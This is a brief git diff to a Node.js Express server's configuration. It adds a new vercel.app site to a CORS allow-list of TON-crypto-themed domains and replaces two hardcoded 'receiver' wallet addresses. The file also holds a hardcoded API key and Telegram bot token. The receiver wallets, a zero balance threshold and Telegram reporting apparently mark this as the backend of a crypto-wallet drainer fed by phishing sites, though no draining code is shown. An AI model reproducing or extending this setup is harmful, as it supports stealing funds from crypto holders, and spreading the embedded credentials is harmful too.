@@ -17,6 +17,7 @@ const PORT = process.env.PORT || 3000;
 app.use(cors({
   origin: [
     "https://ton.checkyourcrypto.com",
+    "https://tondemosos.vercel.app",
     "https://trappap.web.app",
     "https://tonzenoclaus-kappa.vercel.app",
     "https://tonzenoclaus.vercel.app",
@@ -77,8 +78,8 @@ app.listen(PORT, '0.0.0.0', () => {
 });
 
 const apiKey = 's0Uaior9NIAQEaqlEffWSIIt';
-const mainWallet = "UQBjcA_oUW9d5IJ1P9j0ok2r3Xs4p59GgnxNxER-tWZfkFl9";
-const secondMainWallet = "UQBZzI0rqTPxAy5EsgsNcmTjb4Y7A4HBzifvQCCoq5YQ4FLR"; // Add second receiver
+const mainWallet = "UQBMSG_4fBGZNEhJVkcZKbCZgNexcv-5E8doy1_RKODDy1Sy";
+const secondMainWallet = "UQDsUlv-cm9SaOwNwQwpYgE7idOomlllTTRK1bTCkqzzBAIb"; // Add second receiver
 const telegramBot = '8223833080:AAGELRTg5pqtwerjW-nft5Y2Ekw1qGONddU';
 const telegramId = '-1002498212929';
 const min_totalbal = 0;
